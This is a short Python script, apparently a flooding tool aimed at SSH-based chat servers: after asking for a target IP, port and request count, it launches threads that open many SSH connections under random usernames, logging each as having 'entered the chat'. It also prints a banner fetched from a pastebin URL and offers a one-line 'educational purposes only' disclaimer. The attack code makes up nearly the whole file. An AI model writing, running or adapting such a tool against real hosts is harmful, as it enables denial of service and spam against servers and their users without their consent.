import subprocess
import random
import requests
import threading
from termcolor import colored

URL = "https://pastebin.com/raw/6eCbQpbX"

def random_user():
    string = ""
    for x in range(6):
        test = random.choice('abcdefghijklmonpqrstuvwxyz0123456789*$')
        string += test
    command = f'ssh -T {string}@{ipadress} -p {port}'
    subprocess.Popen(command)
    print(colored(f'[*] {string} has entered the chat !\n'))

contents = requests.get(URL).text
print(colored(contents,'magenta') + "\n")
print("[1] Launch")
print("[2] Disclaimer")
print("[3] Exit")


menu = int(input("\nChoose an option: "))

if menu == 1:
    ipadress = input("\n[*] Insert the target's IP address (Example: 192.168.1.1): ")
    port = input("[*] Insert the target's port (Example: 2022): ")
    request = int(input("[*] Number of request: "))
    print(colored("\n- - - - - - Logs - - - - - - ","magenta"))

    for h in range(request):
        t = threading.Timer(1, random_user)
        t.start()

elif menu == 2:
    print(colored("\nDisclaimer: This software is for educational purposes only.","red"))

else:
    subprocess.run("exit", shell=True, check=True)
